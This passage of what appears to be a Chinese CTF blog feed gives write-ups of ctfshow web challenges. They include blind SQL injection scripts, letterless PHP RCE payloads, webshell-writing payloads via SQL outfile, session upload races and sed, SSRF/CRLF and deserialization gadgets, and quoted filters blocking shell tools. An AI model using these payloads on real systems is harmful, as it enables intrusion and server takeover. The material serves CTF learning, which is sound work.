$get_flag);\n        $get_flag = str_ireplace(\"more\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"tail\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"less\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"head\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"tac\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"$\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"sort\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"curl\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"nc\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"bash\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"php\", \"36dCTFShow\", $get_flag);\n        echo \"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;\";\n        system($get_flag);\n    }else{\n        die(\"快到非洲了\");\n    }\n}else{\n    die(\"去非洲吧\");\n}\n?&gt;\n</code></pre>\n<p><strong>首先绕过第一个正则</strong></p>\n<p>要为只由数字、点、横杠组成，同时正反序 intval 的值相同，并且不为回文字符串</p>\n<p>这里有两种构造方法</p>\n<p>一是利用浮点数的精度 如<code>100.0010100.0010</code></p>\n<p>二是利用<code>inval</code>的特性截断，如<code>.11.-.11.−</code></p>\n<p><strong>其次是要绕过 md5</strong></p>\n<p>这里用了 md5 碰撞，脚本如下</p>\n<pre><code class=\"python\">import hashlib\n\nfor i in range(0,10**33):\n    i = str(i)\n    num = '0e' + i\n    md5 = hashlib.md5(num.encode()).hexdigest()\n    md5 = hashlib.md5(md5.encode()).hexdigest()\n    # print(md5)\n    if md5[0:2] == '0e' and md5[2:].isdigit():\n        print('success str:{}  md5(str):{}'.format(num, md5))\n        break\n    else:\n        if int(i) % 1000000 == 0:\n        print(i)\n</code></pre>\n<p>之后get_flag可以使用<code>\\</code> 绕过，可以用 <code>%09</code> 绕过空格</p>\n<pre><code class=\"raw\">?get_flag=ca\\t&lt;/flag\n?get_flag=ca\\t%09/flag\n</code></pre>\n<p>或者也可以使用nl写文件</p>\n<h2 id=\"WUSTCTF-朴实无华-Revenge-Revenge\"><a href=\"#WUSTCTF-朴实无华-Revenge-Revenge\" class=\"headerlink\" title=\"WUSTCTF_朴实无华_Revenge_Revenge\"></a>WUSTCTF_朴实无华_Revenge_Revenge</h2><pre><code class=\"raw\">?num=0.00&amp;md5=0e1138100474&amp;get_flag=ta\\c%09flag.p\\hp\n</code></pre>\n<h2 id=\"Login-Only-For-36D\"><a href=\"#Login-Only-For-36D\" class=\"headerlink\" title=\"Login_Only_For_36D\"></a>Login_Only_For_36D</h2><pre><code class=\"python\">from time import sleep\nimport requests\nurl = \"http://621b1844-7d0d-4d4b-b5db-e3dbbccc3b68.challenge.ctf.show/\"\nans = \"\"\nfor i in range(1, 60):\n    for mid in \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\":\n        data = {\n            \"username\": \"admin\\\\\",\n            \"password\": 'or/**/if((password/**/regexp/**/binary/**/\"^{}\"),sleep(10),1)#'.format(ans+mid)\n        }\n        # 请求\n        try:\n            response = requests.post(url=url, data=data, timeout=7)\n            sleep(0.3)\n        except:\n            ans += mid\n            print(ans)\n            break\nprint(ans)\n</code></pre>\n<p>过滤了<code>'=</code>空格</p>\n<p><code>regexp</code>注入，时间盲注</p>\n<p>得到密码<code>ILoVeThlrtySixD</code></p>\n<h2 id=\"你取吧\"><a href=\"#你取吧\" class=\"headerlink\" title=\"你取吧\"></a>你取吧</h2><pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nshow_source(__FILE__);\n$hint=file_get_contents('php://filter/read=convert.base64-encode/resource=hhh.php');\n$code=$_REQUEST['code'];\n$_=array('a','b','c','d','e','f','g','h','i','j','k','m','n','l','o','p','q','r','s','t','u','v','w','x','y','z','\\~','\\^');\n$blacklist = array_merge($_);\nforeach ($blacklist as $blacklisted) {\n    if (preg_match ('/' . $blacklisted . '/im', $code)) {\n        die('nonono');\n    }\n}\neval(\"echo($code);\");\n?&gt;\n</code></pre>\n<h3 id=\"无字母-rce\"><a href=\"#无字母-rce\" class=\"headerlink\" title=\"无字母 rce\"></a>无字母 rce</h3><h4 id=\"p-神-payload\"><a href=\"#p-神-payload\" class=\"headerlink\" title=\"p 神 payload\"></a>p 神 payload</h4><pre><code class=\"php\">&lt;?php\n$_=[];\n$_=@\"$_\"; // $_='Array';\n$_=$_['!'=='@']; // $_=$_[0];\n$___=$_; // A\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n$___.=$__; // S\n$___.=$__; // S\n$__=$_;\n$__++;$__++;$__++;$__++; // E \n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R\n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$___.=$__;\n\n$____='_';\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$____.=$__;\n\n$_=$$____;\n$___($_[_]); // ASSERT($_POST[_]);\n</code></pre>\n<h3 id=\"利用原数组构建\"><a href=\"#利用原数组构建\" class=\"headerlink\" title=\"利用原数组构建\"></a>利用原数组构建</h3><pre><code class=\"python\">s=['a','b','c','d','e','f','g','h','i','j','k','m','n','l','o','p','q','r','s','t','u','v','w','x','y','z','\\~','\\^']\nword=input()\ncode=''\nfor j in word:\n        if j in s:\n            code+='$_['+str(s.index(j))+'].'\n        else:\n            code+=\"'\"+j+\"'\"+\".\"\nprint(code)\n</code></pre>\n<p>system: <code>$_[18].$_[24].$_[18].$_[19].$_[4].$_[11]</code><br>ls： <code>$_[13].$_[18]</code><br>cat： <code>$_[2].$_[0].$_[19]</code><br>flag: <code>$_[5].$_[13].$_[0].$_[6]</code></p>\n<h4 id=\"第一种\"><a href=\"#第一种\" class=\"headerlink\" title=\"第一种\"></a>第一种</h4><p>ls:</p>\n<pre><code class=\"raw\">?code=`$_[13]$_[18]`\n</code></pre>\n<p>nl /* :</p>\n<pre><code class=\"raw\">?code=`$_[12]$_[13]%20/*`\n</code></pre>\n<h4 id=\"第二种\"><a href=\"#第二种\" class=\"headerlink\" title=\"第二种\"></a>第二种</h4><p>system(‘ls’)</p>\n<pre><code class=\"raw\">?code=1);$__=$_[18].$_[24].$_[18].$_[19].$_[4].$_[11];$___=$_[13].$_[18];$__($___);(1\n得到\n1hhh.php hint.php index.php phpjiami.zip\n</code></pre>\n<p>system(‘ls /‘)</p>\n<pre><code class=\"raw\">?code=1);$__=$_[18].$_[24].$_[18].$_[19].$_[4].$_[11];$___=$_[13].$_[18];$__($___.' /');(1\n得到\n1bin dev etc flag home lib media mnt proc root run sbin srv sys tmp usr var\n</code></pre>\n<p>system(‘cat /flag’)</p>\n<pre><code class=\"raw\">?code=1);$__=$_[18].$_[24].$_[18].$_[19].$_[4].$_[11];$___=$_[2].$_[0].$_[19].' /'.$_[5].$_[13].$_[0].$_[6];$__($___.' /');(1\n得到flag\n</code></pre>\n<h3 id=\"预期解\"><a href=\"#预期解\" class=\"headerlink\" title=\"预期解\"></a>预期解</h3><p><code>?code=${$_[7].$_[8].$_[12].$_[19]}</code> 读取 hint 文件</p>\n<p>那么即可下载压缩包，但得出来的是一个混淆后的php文件，大佬的解密php脚本：</p>\n<pre><code class=\"php\">function decrypt($data, $key)\n{\n    $data_1 = '';\n    for ($i = 0; $i &lt; strlen($data); $i++) {\n        $ch = ord($data[$i]);\n        if ($ch &lt; 245) {\n            if ($ch &gt; 136) {\n                $data_1 .= chr($ch / 2);\n            } else {\n                $data_1 .= $data[$i];\n            }\n        }\n    }\n    $data_1 = base64_decode($data_1);\n    $key = md5($key);\n    $j = $ctrmax = 32;\n    $data_2 = '';\n    for ($i = 0; $i &lt; strlen($data_1); $i++) {\n        if ($j &lt;= 0) {\n            $j = $ctrmax;\n        }\n        $j--;\n        $data_2 .=  $data_1[$i] ^ $key[$j];\n    }\n    return $data_2;\n}\n\nfunction find_data($code)\n{\n    $code_end = strrpos($code, '?&gt;');\n    if (!$code_end) {\n        return \"\";\n    }\n    $data_start = $code_end + 2;\n    $data = substr($code, $data_start, -46);\n    return $data;\n}\n\nfunction find_key($code)\n{\n    // $v1 = $v2('bWQ1');\n    // $key1 = $v1('??????');\n    $pos1 = strpos($code, \"('\" . preg_quote(base64_encode('md5')) . \"');\");\n    $pos2 = strrpos(substr($code, 0, $pos1), '$');\n    $pos3 = strrpos(substr($code, 0, $pos2), '$');\n    $var_name = substr($code, $pos3, $pos2 - $pos3 - 1);\n    $pos4 = strpos($code, $var_name, $pos1);\n    $pos5 = strpos($code, \"('\", $pos4);\n    $pos6 = strpos($code, \"')\", $pos4);\n    $key = substr($code, $pos5 + 2, $pos6 - $pos5 - 2);\n    return $key;\n}\n\n$input_file = $argv[1];\n$output_file = $argv[1] . '.decrypted.php';\n\n$code = file_get_contents($input_file);\n\n$data = find_data($code);\nif (!$code) {\n    echo '未找到加密数据', PHP_EOL;\n    exit;\n}\n\n$key = find_key($code);\nif (!$key) {\n    echo '未找到秘钥', PHP_EOL;\n    exit;\n}\n\n$decrypted = decrypt($data, $key);\n$uncompressed = gzuncompress($decrypted);\n// 由于可以不勾选代码压缩的选项，所以这里判断一下是否解压成功，解压失败就是没压缩\nif ($uncompressed) {\n    $decrypted = str_rot13($uncompressed);\n} else {\n    $decrypted = str_rot13($decrypted);\n}\nfile_put_contents($output_file, $decrypted);\necho '解密后文件已写入到 ', $output_file, PHP_EOL;\n</code></pre>\n<p>用法： <code>php 该解密脚本 待解密的php文件</code> ，得到：</p>\n<p><code>@assert($_POST[6]);</code>为一句话木马，蚁剑登陆，连接类型选择 base64</p>\n<h2 id=\"你没见过的注入\"><a href=\"#你没见过的注入\" class=\"headerlink\" title=\"你没见过的注入\"></a>你没见过的注入</h2><p>根据提示查看txt文件，那么必然是robots.txt，输入后可以看到/pwreset.php ，进入为密码重置页面，重置密码为1，登录，发现为文件上传页面</p>\n<p>尝试性地上传txt，jpg 文件，可以看到文件被打包成zip文件，并在后面跟上filetype的判断</p>\n<p>搜索资料，发现为文件类型注入，通过修改图片的 type 来完成注入</p>\n<p>可以猜测语句是<code>insert into file values (“filename”,“filetype”,“fileextra”)</code>，没有作任何过滤，可以写一句话进去</p>\n<p>一般写成16进制形式，避免语句本身的单引号双引号对拼接造成干扰</p>\n<pre><code class=\"sql\">select \"&lt;?=`$_POST[1]`;\" into outfile \"/var/www/html/1.php\";\nselect 0x003c3f3d60245f504f53545b315d603b into outfile \"/var/www/html/1.php\";\n# 其他 eval 应该过滤了，多次上传没有成功\n</code></pre>\n<p>使用exiftool工具</p>\n<pre><code class=\"bash\">exiftool -overwrite_original -comment=\"zhong\\\"');select 0x3c3f3d60245f504f53545b315d603b into outfile \\\"/var/www/html/1.php\\\";\" 1.jpg\n# 分号前面为闭合前面语句\n# 其中 1.jpg 的大小要尽可能的小\n</code></pre>\n<p>上传后，访问1.php。分别输入</p>\n<pre><code class=\"raw\">1=ls\n1=ls /\n1=cat /flag\n得到flag\n</code></pre>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/ba492ba4/",
            "url": "http://dpm12345.cn/posts/ba492ba4/",
            "title": "36D杯练手赛",
            "date_published": "2022-10-04T15:20:32.000Z",
            "content_html": "<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"easy-shell\"><a href=\"#easy-shell\" class=\"headerlink\" title=\"easy shell\"></a>easy shell</h2><p>进入后查看源码，看到注释<code>&lt;!--md5($secret.$name)===$pass --&gt;</code></p>\n<p>先随便输入，发现cookie中有hash值<code>de73312423b835b22bfdc3c6da7b63e9</code>，猜测为满足条件的md5值</p>\n<p>于是将该值赋给pass，提交后发现为404，但是此时仔细发现，该页面是一个404.html，于是推测发生了重定向</p>\n<p>尝试bp抓包，得到</p>\n<p><img data-src=\"/../../../post_images/%E5%9B%BE%E7%89%87/36Deasy_shell_1.jpg\"></p>\n<p>发现 <code>flflflflag.php</code> 文件，抓包访问，得到</p>\n<p><img data-src=\"/../../../post_images/%E5%9B%BE%E7%89%87/36Deasy_shell_2.jpg\"></p>\n<p>发现文件包含，尝试使用伪协议</p>\n<pre><code class=\"raw\">?file=php://filter/convert.base64-encode/resource=index.php\n?file=php://filter/convert.base64-encode/resource=flflflflag.php\n</code></pre>\n<p>base64 解码后得到</p>\n<p>index.php</p>\n<pre><code class=\"php\">&lt;?php\ninclude 'config.php';\n@$name=$_GET['name'];\n@$pass=$_GET['pass'];\nif(md5($secret.$name)===$pass){\n    echo '&lt;script language=\"javascript\" type=\"text/javascript\"&gt;\n           window.location.href=\"flflflflag.php\";\n    &lt;/script&gt;\n';\n}else{\n    setcookie(\"Hash\",md5($secret.$name),time()+3600000);\n    echo \"username/password error\";\n}\n?&gt;\n&lt;html&gt;\n&lt;!--md5($secret.$name)===$pass --&gt;\n&lt;/html&gt;\n</code></pre>\n<p>flflflflag.php</p>\n<pre><code class=\"php\">&lt;html&gt;\n&lt;head&gt;\n&lt;script language=\"javascript\" type=\"text/javascript\"&gt;\n           window.location.href=\"404.html\";\n&lt;/script&gt;\n&lt;title&gt;yesec want Girl friend&lt;/title&gt;\n&lt;/head&gt;\n&lt;&gt;\n&lt;body&gt;\n&lt;?php\n$file=$_GET['file'];\nif(preg_match('/data|input|zip/is',$file)){\n    die('nonono');\n}\n@include($file);\necho 'include($_GET[\"file\"])';\n?&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<p>尝试session文件包含</p>\n<pre><code class=\"python\">import io\nimport sys\nimport requests\nimport threading\n\nhost = 'http://5d6bb0b0-e82d-4a68-b50b-8fd858a7c6ea.chall.ctf.show/flflflflag.php'\nsessid = 'vrhtvjd4j1sd88onr92fm9t2sj'\n\ndef POST(session):\n    while True:\n        f = io.BytesIO(b'a' * 1024 * 50)\n        session.post(\n            host,\n            data={\"PHP_SESSION_UPLOAD_PROGRESS\":\"&lt;?php system('cat *');fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[cmd])?&gt;');echo md5('1');?&gt;\"},\n            files={\"file\":('a.txt', f)},\n            cookies={'PHPSESSID':sessid}\n        )\n\ndef READ(session):\n    while True:\n        response = session.get(f'{host}?file=/tmp/sess_{sessid}')\n        # print(response.text)\n        if 'c4ca4238a0b923820dcc509a6f75849b' not in response.text:\n        # if 'flag' not in response.text:\n            print('[+++]retry')\n        else:\n            print(response.text)\n            sys.exit(0)\n\n\nwith requests.session() as session:\n    t1 = threading.Thread(target=POST, args=(session, ))\n    t1.daemon = True\n    t1.start()\n    READ(session)\n</code></pre>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/f685e8f8/",
            "url": "http://dpm12345.cn/posts/f685e8f8/",
            "title": "单身杯",
            "date_published": "2022-10-04T15:10:32.000Z",
            "content_html": "<h1 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h1><h2 id=\"没大没小的串串\"><a href=\"#没大没小的串串\" class=\"headerlink\" title=\"没大没小的串串\"></a>没大没小的串串</h2><p>爆破即可</p>\n<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"web-签到\"><a href=\"#web-签到\" class=\"headerlink\" title=\"web 签到\"></a>web 签到</h2><pre><code class=\"php\">&lt;?php\n\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2022-03-19 12:10:55\n# @Last Modified by:   h1xa\n# @Last Modified time: 2022-03-19 13:27:18\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\nerror_reporting(0);\nhighlight_file(__FILE__);\n\n$file = $_POST['file'];\n\nif(isset($file)){\n    if(strrev($file)==$file){\n        include $file;\n    }\n\n}\n</code></pre>\n<p>主要是字符串的反转 可利用data伪协议，<code>?&gt;</code>后可加任意字符，故payload</p>\n<pre><code class=\"raw\">file=data://text/plain,&lt;?php eval($_POST[1]);?&gt;&gt;?;)]1[TSOP_$(lave php?&lt;,nialp/txet//:atad&amp;1=system(\"cat /f1agaaa\");\n</code></pre>\n<h2 id=\"easyPHP\"><a href=\"#easyPHP\" class=\"headerlink\" title=\"easyPHP\"></a>easyPHP</h2><pre><code class=\"php\">&lt;?php\n\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2022-03-19 12:10:55\n# @Last Modified by:   h1xa\n# @Last Modified time: 2022-03-19 13:27:18\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\nerror_reporting(0);\nhighlight_file(__FILE__);\n\n$cmd = $_POST['cmd'];\n$param = $_POST['param'];\n\nif(isset($cmd) &amp;&amp; isset($param)){\n    $cmd=escapeshellcmd(substr($cmd,0,3)).\" \".escapeshellarg($param).\" \".__FILE__;\n    shell_exec($cmd);\n}\n</code></pre>\n<pre><code class=\"raw\">sed 全称是：Stream EDitor\n调用 sed 命令有两种形式：\nsed [options] 'command' file (s)\nsed [options] -f scriptfile file (s)\na\\ 在当前行后面加入一行文本。\nb label 分支到脚本中带有标记的地方，如果分支不存在则分支到脚本的末尾。\nc\\ 用新的文本改变本行的文本。\nd 从模板块（Pattern space）位置删除行。\nD 删除模板块的第一行。\ni\\ 在当前行上面插入文本。\nh 拷贝模板块的内容到内存中的缓冲区。\nH 追加模板块的内容到内存中的缓冲区\ng 获得内存缓冲区的内容，并替代当前模板块中的文本。\nG 获得内存缓冲区的内容，并追加到当前模板块文本的后面。\nl 列表不能打印字符的清单。\nn 读取下一个输入行，用下一个命令处理新的行而不是用第一个命令。\nN 追加下一个输入行到模板块后面并在二者间嵌入一个新行，改变当前行号码。\np 打印模板块的行。\nP（大写）打印模板块的第一行。\nq 退出 Sed。\nr file 从 file 中读行。\nt labelif 分支，从最后一行开始，条件一旦满足或者 T，t 命令，将导致分支到带有标号的命令处，或者到脚本的末尾。\nT label 错误分支，从最后一行开始，一旦发生错误或者 T，t 命令，将导致分支到带有标号的命令处，或者到脚本的末尾。\nw file 写并追加模板块到 file 末尾。\nW file 写并追加模板块的第一行到 file 末尾。\n！表示后面的命令对所有没有被选定的行发生作用。\ns/re/string 用 string 替换正则表达式 re。\n= 打印当前行号码。\n# 把注释扩展到下一个换行符以前。\n以下的是替换标记 g 表示行内全面替换。\np 表示打印行。\nw 表示把行写入一个文件。\nx 表示互换模板块中的文本和缓冲区中的文本。\ny 表示把一个字符翻译为另外的字符（但是不用于正则表达式）\n选项编辑 播报\n-e command,--expression=command 允许多台编辑。\n-h,--help 打印帮助，并显示 bug 列表的地址。\n-n,--quiet,--silent 取消默认输出。\n-f,--filer=script-file 引导 sed 脚本文件名。\n-V,--version 打印版本和版权信息。\n元字符集编辑 播报\n^ 锚定行的开始如：/^sed / 匹配所有以 sed 开头的行。\n$ 锚定行的结束 如：/sed$/ 匹配所有以 sed 结尾的行。\n. 匹配一个非换行符的字符 如：/s.d/ 匹配 s 后接一个任意字符，然后是 d。\n* 匹配零或多个字符 如：/*sed / 匹配所有模板是一个或多个空格后紧跟 sed 的行。\n[] 匹配一个指定范围内的字符，如 /[Ss] ed / 匹配 sed 和 Sed。\n[^] 匹配一个不在指定范围内的字符，如：/[^A-RT-Z] ed / 匹配不包含 A-R 和 T-Z 的一个字母开头，紧跟 ed 的行。\n\\(..\\）保存匹配的字符，如 s/\\(love\\) able/\\1rs，loveable 被替换成 lovers。\n&amp;；保存搜索字符用来替换其他字符，如 s/love/**&amp;**/，love 这成 **love**。\n\\&lt;；锚定单词的开始，如：/\\&lt;love / 匹配包含以 love 开头的单词的行。\n\\&gt;；锚定单词的结束，如 /love\\&gt;/ 匹配包含以 love 结尾的单词的行。\nx\\{m\\} 重复字符 x，m 次，如：/0\\{5\\}/ 匹配包含 5 个 o 的行。\nx\\{m,\\} 重复字符 x，至少 m 次，如：/o\\{5,\\}/ 匹配至少有 5 个 o 的行。\nx\\{m,n\\} 重复字符 x，至少 m 次，不多于 n 次，如：/o\\{5,10\\}/ 匹配 5--10 个 o 的行。\n</code></pre>\n<p>使用sed命令</p>\n<pre><code class=\"raw\">cmd=sed&amp;param=/php\\|POST\\|exec/!dw1.php\n</code></pre>\n<p>其意义为，sed命令，param的<code>/php\\|POST\\|exec/</code>为正则匹配表达式，用于匹配符合条件的行，<code>!</code>表示后面的命令对所有没有被选定的行发生作用，即后面的<code>d</code>删除行命令对所以未能匹配的行删除，<code>w</code>即把行写入文件</p>\n<p>执行后1.php的内容如下</p>\n<pre><code class=\"php\">&lt;?php\n$cmd = $_POST['cmd'];\n$param = $_POST['param'];\n    shell_exec($cmd);\n</code></pre>\n<p>之后切到1.php，输入payload</p>\n<pre><code class=\"bash\">cmd=echo \"&lt;?php eval(\\$_POST[1]);?&gt;\"&gt;2.php\n</code></pre>\n<p>这里在美元符号<code>$</code>前加上<code>\\</code>的原因为，在双引号下，<code>$_POST</code>会被当做为一个已经定义过的变量，并做替换，若没有<code>\\</code>，那么写入文件中的内容为</p>\n<pre><code class=\"php\">&lt;?php eval([1]);?&gt;\n</code></pre>\n<p>因此需要使得<code>$_POST</code>不作为变量名，这里有两种方案</p>\n<ol>\n<li><p>双引号改为单引号，在 shell 命令中，单引号中的变量是无效的</p>\n</li>\n<li><p>双引号包裹，在<code>$</code>前加上转移符号<code>\\</code></p>\n</li>\n</ol>\n<p>再切换到2.php, 之后就正常rce</p>\n<h2 id=\"姻缘测试\"><a href=\"#姻缘测试\" class=\"headerlink\" title=\"姻缘测试\"></a>姻缘测试</h2><p>SSTI 注入</p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/d3333ead/",
            "url": "http://dpm12345.cn/posts/d3333ead/",
            "title": "反序列化",
            "date_published": "2022-10-04T14:16:40.000Z",
            "content_html": "<h1 id=\"web-258\"><a href=\"#web-258\" class=\"headerlink\" title=\"web 258\"></a>web 258</h1><p>相比于上一题多了正则匹配：<code>if(!preg_match('/[oc]:\\d+:/i', $_COOKIE['user']))</code></p>\n<p>由构造的序列化字符串，只需将<code>O:</code>改为<code>O:+</code>即可</p>\n<h1 id=\"web-259\"><a href=\"#web-259\" class=\"headerlink\" title=\"web 259\"></a>web 259</h1><p>这个题利用的是php原生类SoapClient<br>该类的构造函数如下：</p>\n<p><code>public SoapClient :: SoapClient （mixed $wsdl [，array $options ]）</code></p>\n<p>flag.php</p>\n<pre><code class=\"php\">$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);\narray_pop($xff);\n$ip = array_pop($xff);\n\n\nif($ip!=='127.0.0.1'){\n    die('error');\n}else{\n    $token = $_POST['token'];\n    if($token=='ctfshow'){\n        file_put_contents('flag.txt',$flag);\n    }\n}\n</code></pre>\n<p>当然这是个不完整的源码，应该还有一条判断真实ip的也就是</p>\n<pre><code class=\"php\">if($_SERVER['REMOTE_ADDR']==='127.0.0.1'){\nxxxxxx;\n}\n</code></pre>\n<p>所以首先得利用<code>ssrf</code>访问<code>flag.php</code>接着构造post数据<code>token=ctfshow</code>和请求头<code>X-Forwarded-For</code>就能把flag写到flag.txt中了。</p>\n<p>那么ssrf漏洞在哪呢，这就得用到我们前面提到的SoapClient类了。这个类中有个<code>__call</code>魔术方法（当调用不存在的方法时触发），会调用SoapClient类的构造方法。</p>\n<p>另外用到的一个文章识点就是CRLF</p>\n<p>大概如下：</p>\n<p>在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码</p>\n<p>就比如跳转网站，一般其跳转包为</p>\n<pre><code class=\"html\">HTTP/1.1 302 Moved Temporarily \nDate: Fri, 27 Jun 2014 17:52:17 GMT \nContent-Type: text/html \nContent-Length: 154 \nConnection: close \nLocation: http://xxxx\n</code></pre>\n<p>如果我们将<code>http://xxxx</code>修改为<code>http://xxxx%0axxxx</code></p>\n<p>那么显然<code>Location</code>段会变为</p>\n<pre><code class=\"html\">Location: http://xxxx\nxxxx\n</code></pre>\n<p>这样我们就可以以此来修改跳转包，比如<code>Set-cookie</code>，从而使得进入跳转网站自带cookie</p>\n<p>同理，如果我们将<code>%0a</code>修改为<code>%0d%0a%0d%0a</code>，即两个CRLF(换行)</p>\n<p>那么<code>xxxx</code>会进入HTTP Body，即会显示，如果为<code>&lt;img src=1 onerror=alert(/xss/)&gt;</code>那么会显示一张图片，并在错误时进行弹窗</p>\n<p>但由于浏览器的XSS Filter，同时需要注入<code>X-XSS-Protection:0</code>，使得<code>alert</code>正常执行</p>\n<p>由此，我们利用SoapClient进行请求包的构造</p>\n<p>大致结构为</p>\n<pre><code class=\"html\">Content-Type: text/html \nContent-Length: 154 \nLocation: http://127.0.0.1/flag\nX-Forwarded-For:127.0.0.1\n\ntoken=ctfshow\n</code></pre>\n<p>所以payload</p>\n<pre><code class=\"php\">&lt;?php\n\n$url = \"http://127.0.0.1/flag.php\";\n$post = \"token=ctfshow\";\n$a = new SoapClient(null,array('location' =&gt; $url,'user_agent'=&gt;'xx^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded ^^Content-Length:'.(string)strlen($post).'^^^^'.$post,'uri'=&gt;'ssrf'));\n\necho urlencode(str_replace('^^',\"\\r\\n\",serialize($a)));\n</code></pre>\n<h1 id=\"web-260\"><a href=\"#web-260\" class=\"headerlink\" title=\"web 260\"></a>web 260</h1><pre><code class=\"php\">&lt;?php\n\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude('flag.php');\n\nif(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){\n    echo $flag;\n}\n</code></pre>\n<p>由源码知，只需反序列化后的字符串包含<code>ctfshow_i_love_36D</code>即可</p>\n<p>xxxxxxxxxx&nbsp;?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.phpphp</p>\n<pre><code class=\"php\">&lt;?php\n\n$a = \"ctfshow_i_love_36D\";\n\necho urlencode(serialize($a));\n</code></pre>\n<h1 id=\"web-261\"><a href=\"#web-261\" class=\"headerlink\" title=\"web 261\"></a>web 261</h1><pre><code class=\"php\">&lt;?php\n\nhighlight_file(__FILE__);\n\nclass ctfshowvip{\n    public $username;\n    public $password;\n    public $code;\n\n    public function __construct($u,$p){\n        $this-&gt;username=$u;\n        $this-&gt;password=$p;\n    }\n    public function __wakeup(){\n        if($this-&gt;username!='' || $this-&gt;password!=''){\n            die('error');\n        }\n    }\n    public function __invoke(){\n        eval($this-&gt;code);\n    }\n\n    public function __sleep(){\n        $this-&gt;username='';\n        $this-&gt;password='';\n    }\n    public function __unserialize($data){\n        $this-&gt;username=$data['username'];\n        $this-&gt;password=$data['password'];\n        $this-&gt;code = $this-&gt;username.$this-&gt;password;\n    }\n    public function __destruct(){\n        if($this-&gt;code==0x36d){\n            file_put_contents($this-&gt;username, $this-&gt;password);\n        }\n    }\n}\n\nunserialize($_GET['vip']);\n</code></pre>\n<p>这题主要考察魔术方法的应用，</p>\n<p><code>__construct</code>为构造方法，</p>\n<p><code>__wakeup</code>准备对象资源，</p>\n<p><code>__invoke</code>当尝试以调用函数的方式调用一个对象时，<code>__invoke()</code>方法会被自动调用。 </p>\n<p><code>__sleep()</code>方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。 </p>\n<p><code>__unserialize</code>反序列化调用的方法</p>\n<p><code>__destruct</code>析构方法</p>\n<p>而如果类中同时定义了<code>__unserialize</code>和<code>__wakeup()</code>两个魔术方法，则只有<code>__unserialize()</code>方法会生效，<code>__wakeup()</code>方法会被忽略。 </p>\n<p>而在代码中，我们必然只能调用<code>__unserialize</code>和<code>__destruct</code>两个方法</p>\n<p>其中<code>__destruct</code>中由<code>file_put_contents</code>可以想到写一句话到文件里，其只需要<code>$this-&gt;code==0x36d</code>即可</p>\n<p>观察到为<code>==</code>即若等于，那么可以弄出<code>877.phpxxx==0x36d</code>，即控制了文件名，而内容为一句话，也可以控制</p>\n<p>观察到反序列化中均可控，那么可以使<code>$username='877.php'</code>,<code>$password='&lt;?php eval($_POST[1]);?&gt;'</code></p>\n<p>即可成功写入一句话，之后正常rce即可</p>\n<h1 id=\"web262\"><a href=\"#web262\" class=\"headerlink\" title=\"web262\"></a>web262</h1><p>源码</p>\n<pre><code class=\"php\">&lt;?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-12-03 02:37:19\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-12-03 